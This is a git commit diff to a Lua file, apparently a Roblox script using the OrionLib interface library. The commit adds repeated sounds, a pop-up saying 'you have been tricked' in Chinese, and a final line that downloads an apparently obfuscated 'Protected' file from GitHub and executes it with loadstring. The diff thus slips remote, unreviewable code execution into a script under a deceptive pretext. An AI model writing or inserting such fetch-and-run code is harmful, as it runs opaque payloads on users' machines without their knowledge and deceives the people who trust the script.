9215622c8a180b21f658ceb60979dd69eacc5ec4
jfjfjfvg <136352489+jfjfjfjvg@users.noreply.github.com>
2024-10-31 19:06:02 +0800

    Update 田地.lua

--- 田地.lua
+++ 田地.lua
@@ -8,9 +8,22 @@ OrionLib:MakeNotification({
                 local sound = Instance.new("Sound", workspace)
 sound.SoundId = "rbxassetid://4590662766"
 sound:Play()
+task.wait(1)
 local sound = Instance.new("Sound", workspace)
 sound.SoundId = "rbxassetid://4590662766"
 sound:Play()
+task.wait(1)
 local sound = Instance.new("Sound", workspace)
 sound.SoundId = "rbxassetid://4590662766"
 sound:Play()
+task.wait(5)
+OrionLib:MakeNotification({
+                    Name = "RNG",
+                    Content = "你被骗了",
+                    Time = 5
+                })    
+                
+                local sound = Instance.new("Sound", workspace)
+sound.SoundId = "rbxassetid://4590662766"
+sound:Play()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jfjfjfjvg/RNGNB/refs/heads/main/Protected_7939297926025379.txt"))()
